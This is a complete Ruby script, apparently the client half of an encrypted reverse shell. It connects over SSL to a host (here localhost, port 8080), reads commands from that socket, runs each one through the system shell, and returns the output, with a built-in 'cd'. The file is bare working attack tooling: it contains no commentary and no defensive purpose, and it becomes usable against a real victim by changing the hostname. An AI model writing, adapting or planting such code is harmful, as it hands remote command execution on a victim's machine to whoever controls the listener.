#!/usr/bin/env ruby
require 'socket'
require 'openssl'
require 'open3'
require 'shellwords'
def command_loop(socket)
  loop {
    command = socket.gets
    command = command.chomp
    exit if command == 'exit'
    shell_command, *arguments = Shellwords.shellsplit(command)
    if BUILTINS[shell_command]
      BUILTINS[shell_command].call(*arguments)
      socket.print("#{Dir.pwd}\n")
    else
      stdin, stdout_and_stderr = Open3.popen2e("#{command}")
      command_array = []
      command_array << stdout_and_stderr.readlines.join.chomp
      socket.print("#{command_array}\n")
    end
  }
rescue
  @ssl_socket.puts("command does not exist\n")
  command_loop(@ssl_socket)
end
def connect_to_host
  hostname = 'localhost'
  port = 8080
  socket = TCPSocket.new(hostname, port)
  ssl_context = OpenSSL::SSL::SSLContext.new()
  @ssl_socket = OpenSSL::SSL::SSLSocket.new(socket, ssl_context)
  @ssl_socket.sync_close = true
  @ssl_socket.connect
  command_loop(@ssl_socket)
end
begin
  BUILTINS = {'cd' => lambda { |dir| Dir.chdir(dir) }}
  connect_to_host
end